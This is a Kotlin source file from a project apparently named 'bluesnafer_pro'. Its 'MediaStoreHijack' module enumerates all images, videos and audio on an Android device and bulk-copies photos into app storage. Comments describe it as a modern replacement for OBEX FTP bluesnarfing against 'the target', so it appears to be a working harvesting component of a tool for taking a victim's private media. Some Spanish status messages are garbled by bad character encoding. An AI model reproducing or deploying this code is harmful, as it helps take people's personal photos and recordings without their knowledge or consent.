package com.bluesnafer_pro

import android.content.ContentResolver
import android.content.ContentUris
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import java.io.*

object MediaStoreHijack {
    private const val TAG = "MediaStoreHijack"

    /**
     * Enumerate all images from MediaStore
     * Requires READ_EXTERNAL_STORAGE permission
     */
    fun enumerateMediaStore(context: Context): List<Map<String, Any>> {
        val images = mutableListOf<Map<String, Any>>()

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.BUCKET_DISPLAY_NAME
        )

        val sortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"

        val cursor: Cursor? = context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,  // Selection
            null,  // Selection args
            sortOrder
        )

        cursor?.use {
            val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val dateColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)
            val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
            val mimeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)
            val bucketColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)

            while (it.moveToNext()) {
                val id = it.getLong(idColumn)
                val name = it.getString(nameColumn) ?: "unknown"
                val date = it.getLong(dateColumn)
                val size = it.getLong(sizeColumn)
                val mimeType = it.getString(mimeColumn) ?: "image/jpeg"
                val bucket = it.getString(bucketColumn) ?: "Unknown"

                val contentUri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    id
                ).toString()

                images.add(
                    mapOf(
                        "id" to id,
                        "name" to name,
                        "date" to date,
                        "size" to size,
                        "mimeType" to mimeType,
                        "bucket" to bucket,
                        "uri" to contentUri
                    )
                )
            }
        }

        Log.d(TAG, "Enumerated ${images.size} images from MediaStore")
        return images
    }

    /**
     * Extract a single image from MediaStore by URI
     * Copies the file to app's private storage
     */
    fun extractMediaStoreFile(context: Context, uriString: String): Map<String, Any> {
        return try {
            Log.d(TAG, "Extracting MediaStore file: $uriString")

            val uri = Uri.parse(uriString)
            val contentResolver = context.contentResolver

            val inputStream = contentResolver.openInputStream(uri)
                ?: return mapOf("success" to false, "error" to "Cannot open input stream")

            val bytes = inputStream.readBytes()
            inputStream.close()

            if (bytes.isEmpty()) {
                return mapOf("success" to false, "error" to "Empty media content", "uri" to uriString)
            }

            val fileName = "media_${System.currentTimeMillis()}_${uri.lastPathSegment}"
            val outputDir = context.getExternalFilesDir("extracted")
            if (outputDir != null && !outputDir.exists()) {
                outputDir.mkdirs()
            }

            val outputFile = File(outputDir, fileName)
            outputFile.writeBytes(bytes)
            val saved = outputFile.exists() && outputFile.length() > 0L

            Log.d(TAG, "File extracted to: ${outputFile.absolutePath} (${bytes.size} bytes)")

            mapOf(
                "success" to saved,
                "path" to outputFile.absolutePath,
                "size" to bytes.size,
                "originalUri" to uriString,
                "message" to if (saved) "MediaStore file extracted" else "MediaStore: fallo al guardar archivo"
            )

        } catch (e: Exception) {
            Log.e(TAG, "MediaStore extraction failed", e)
            mapOf("success" to false, "error" to (e.message ?: "unknown error"), "uri" to uriString)
        }
    }

    /**
     * Enumerate videos from MediaStore
     */
    fun enumerateMediaStoreVideos(context: Context): List<Map<String, Any>> {
        val videos = mutableListOf<Map<String, Any>>()

        val projection = arrayOf(
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.DATE_TAKEN,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.DURATION
        )

        val cursor: Cursor? = context.contentResolver.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Video.Media.DATE_TAKEN} DESC"
        )

        cursor?.use {
            val idColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
            val nameColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
            val dateColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_TAKEN)
            val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
            val durationColumn = it.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION)

            while (it.moveToNext()) {
                val id = it.getLong(idColumn)
                val name = it.getString(nameColumn) ?: "unknown"
                val date = it.getLong(dateColumn)
                val size = it.getLong(sizeColumn)
                val duration = it.getLong(durationColumn)

                val contentUri = ContentUris.withAppendedId(
                    MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    id
                ).toString()

                videos.add(
                    mapOf(
                        "id" to id,
                        "name" to name,
                        "date" to date,
                        "size" to size,
                        "duration" to duration,
                        "uri" to contentUri
                    )
                )
            }
        }

        Log.d(TAG, "Enumerated ${videos.size} videos from MediaStore")
        return videos
    }

    /**
     * Enumerate audio files from MediaStore
     */
    fun enumerateMediaStoreAudio(context: Context): List<Map<String, Any>> {
        val audioFiles = mutableListOf<Map<String, Any>>()

        val projection = arrayOf(
            MediaStore.Audio.Media._ID,
            MediaStore.Audio.Media.DISPLAY_NAME,
            MediaStore.Audio.Media.TITLE,
            MediaStore.Audio.Media.ARTIST,
            MediaStore.Audio.Media.DATE_ADDED,
            MediaStore.Audio.Media.SIZE,
            MediaStore.Audio.Media.DURATION
        )

        val cursor: Cursor? = context.contentResolver.query(
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Audio.Media.DATE_ADDED} DESC"
        )

        cursor?.use {
            val idColumn = it.getColumnIndexOrThrow(MediaStore.Audio.Media._ID)
            val nameColumn = it.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME)
            val titleColumn = it.getColumnIndexOrThrow(MediaStore.Audio.Media.TITLE)
            val artistColumn = it.getColumnIndexOrThrow(MediaStore.Audio.Media.ARTIST)
            val dateColumn = it.getColumnIndexOrThrow(MediaStore.Audio.Media.DATE_ADDED)
            val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Audio.Media.SIZE)
            val durationColumn = it.getColumnIndexOrThrow(MediaStore.Audio.Media.DURATION)

            while (it.moveToNext()) {
                val id = it.getLong(idColumn)
                val name = it.getString(nameColumn) ?: "unknown"
                val title = it.getString(titleColumn) ?: name
                val artist = it.getString(artistColumn) ?: "Unknown Artist"
                val date = it.getLong(dateColumn)
                val size = it.getLong(sizeColumn)
                val duration = it.getLong(durationColumn)

                val contentUri = ContentUris.withAppendedId(
                    MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                    id
                ).toString()

                audioFiles.add(
                    mapOf(
                        "id" to id,
                        "name" to name,
                        "title" to title,
                        "artist" to artist,
                        "date" to date,
                        "size" to size,
                        "duration" to duration,
                        "uri" to contentUri
                    )
                )
            }
        }

        Log.d(TAG, "Enumerated ${audioFiles.size} audio files from MediaStore")
        return audioFiles
    }

    /**
     * Batch extract multiple URIs
     */
    fun extractMultipleFiles(context: Context, uris: List<String>): List<Map<String, Any>> {
        return uris.map { uri ->
            extractMediaStoreFile(context, uri)
        }
    }

    /**
     * Batch extract ALL images from MediaStore into app private storage.
     * Modern alternative to OBEX FTP — works on Android 10+ scoped storage
     * when the target has granted READ_MEDIA_IMAGES or legacy storage.
     */
    fun extractAllImages(context: Context, maxImages: Int = 30): Map<String, Any> {
        val extracted = mutableListOf<Map<String, Any>>()
        val enumerated = enumerateMediaStore(context)
        var count = 0

        for (entry in enumerated) {
            if (count >= maxImages) break
            val uri = entry["uri"] as? String ?: continue
            val name = entry["name"] as? String ?: "image_${count}"
            val mimeType = entry["mimeType"] as? String ?: "image/jpeg"

            if (!mimeType.startsWith("image/")) continue

            try {
                val result = extractMediaStoreFile(context, uri)
                if (result["success"] == true) {
                    extracted.add(
                        mapOf(
                            "name" to name,
                            "size" to (result["size"] ?: 0),
                            "localPath" to (result["path"] ?: ""),
                            "remotePath" to uri,
                            "mimeType" to mimeType,
                            "modified" to (entry["date"] ?: "")
                        )
                    )
                    count++
                }
            } catch (_: Exception) {}
        }

        return mapOf(
            "success" to extracted.isNotEmpty(),
            "images" to extracted,
            "imagesCount" to extracted.size,
            "totalBytes" to extracted.fold(0L) { acc, img -> acc + ((img["size"] as? Long ?: 0)) },
            "method" to "mediastore_enhanced",
            "message" to if (extracted.isNotEmpty()) "MediaStore enhanced: ${extracted.size} im�genes extra�das" else "MediaStore: sin im�genes accesibles"
        )
    }
}
